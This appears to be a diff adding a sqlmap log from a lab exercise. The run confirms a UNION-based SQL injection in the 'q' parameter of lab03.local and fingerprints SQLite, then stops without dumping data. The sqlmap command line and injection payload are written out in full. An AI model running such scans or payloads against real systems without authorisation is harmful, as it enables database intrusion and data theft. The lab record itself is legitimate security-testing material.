@@ -1,0 +1,40 @@
+$ sqlmap -u "http://lab03.local:5000/search?q=admin" -p q --batch --level=1 --risk=1
+
+[*] starting @ 09:43:49 /2026-11-07/
+
+[09:43:49] [INFO] testing connection to the target URL
+[09:43:49] [INFO] checking if the target is protected by some kind of WAF/IPS
+[09:43:49] [INFO] testing if the target URL content is stable
+[09:43:49] [INFO] target URL content is stable
+[09:43:49] [INFO] heuristic (basic) test shows that GET parameter 'q' might be injectable
+[09:43:49] [INFO] testing for SQL injection on GET parameter 'q'
+...
+GET parameter 'q' is 'Generic UNION query (NULL) - 1 to 10 columns' injectable
+GET parameter 'q' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 83 HTTP(s) requests:
+---
+Parameter: q (GET)
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 2 columns
+    Payload: q=admin' UNION ALL SELECT CONCAT(CONCAT('qvzvq','uKxfvRwNNHfEjlEcqdnUNvGZibzSZRDcSYYsICIJ'),'qqpjq'),NULL-- rwZL
+---
+[09:43:50] [INFO] testing MySQL
+[09:43:50] [WARNING] the back-end DBMS is not MySQL
+[09:43:50] [INFO] testing Oracle
+[09:43:50] [WARNING] the back-end DBMS is not Oracle
+[09:43:50] [INFO] testing PostgreSQL
+[09:43:50] [WARNING] the back-end DBMS is not PostgreSQL
+[09:43:50] [INFO] testing Microsoft SQL Server
+[09:43:50] [WARNING] the back-end DBMS is not Microsoft SQL Server
+[09:43:50] [INFO] testing SQLite
+[09:43:50] [INFO] confirming SQLite
+[09:43:50] [INFO] actively fingerprinting SQLite
+[09:43:50] [INFO] the back-end DBMS is SQLite
+back-end DBMS: SQLite
+[09:43:50] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/lab03.local'
+
+[*] ending @ 09:43:50 /2026-11-07/
+
+Stop condition reached: parameter 'q' confirmed injectable, back-end DBMS
+identified as SQLite. No --dump performed, consistent with the lab's
+minimal-impact confirmation goal.
